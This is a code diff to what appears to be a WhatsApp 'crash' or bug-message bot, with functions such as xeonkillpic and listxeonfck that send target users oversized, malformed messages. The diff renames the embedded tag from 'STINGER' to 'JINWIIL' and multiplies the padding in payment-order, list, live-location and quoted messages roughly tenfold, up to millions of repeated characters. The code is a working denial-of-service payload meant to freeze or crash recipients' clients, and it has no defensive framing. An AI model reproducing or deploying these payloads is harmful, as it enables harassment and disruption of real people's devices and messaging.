@@ -203,7 +203,7 @@ remoteJid: "status@broadcast"
 "buttons": [
 {
 "name": "review_and_pay",
-"buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+"buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"░ J░░ I░░ N░░ W░░ I░░░ I░░ L░░ 💀░░░\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
 }
 ]
 }
@@ -245,7 +245,7 @@ remoteJid: "status@broadcast"
 },
 message: {
 listResponseMessage: {
-title: `░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░`
+title: `░ J░░ I░░ N░░ W░░ I░░░ I░░ L░░ 💀░░░`
 }
 }
 }
@@ -277,7 +277,7 @@ message: {
   "liveLocationMessage": {
     "degreesLatitude": "p",
     "degreesLongitude": "p",
-    "caption": `░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░`+"ꦾ".repeat(50000),
+    "caption": `░ J░░ I░░ N░░ W░░ I░░░ I░░ L░░ 💀░░░`+"ꦾ".repeat(500000),
     "sequenceNumber": "0",
     "jpegThumbnail": ""
      }
@@ -291,7 +291,7 @@ async function xeonkillpic(target, kuwoted) {
  var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
     interactiveMessage: {
       header: {
-        title: "░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░",
+        title: "░ J░░ I░░ N░░ W░░ I░░░ I░░ L░░ 💀░░░",
         hasMediaAttachment: true,
         ...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/Wppj16p/cheemspic.jpg" } }, { upload: XeonBotInc.waUploadToServer }))
       },
@@ -299,7 +299,7 @@ async function xeonkillpic(target, kuwoted) {
         text: ""
       },
       footer: {
-        text: "›          #░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░"
+        text: "›          #░ J░░ I░░ N░░ W░░ I░░░ I░░ L░░ 💀░░░"
       },
       nativeFlowMessage: {
         messageParamsJson: " ".repeat(1000000)
@@ -316,7 +316,7 @@ await XeonBotInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FB
 async function listxeonfck(target, kuwoted) {
  var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
   'listMessage': {
-    'title': "░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░"+" ".repeat(920000),
+    'title': "░ J░░ I░░ N░░ W░░ I░░░ I░░ L░░ 💀░░░"+" ".repeat(9200000),
         'footerText': `░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░`,
         'description': `░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░░ S҉░░ T҉░░ I҉░░ N҉░░ G҉░░░ E҉░░ R҉░░ 💀░░░`,
         'buttonText': null,
@@ -536,7 +536,7 @@ async function sendExtendedTextMessage(jid) {
         'stanzaId': jid,
         'participant': jid,
         'quotedMessage': {
-          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000)
+          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(500000)
         },
         'disappearingMode': {
           'initiator': "CHANGED_IN_CHAT",
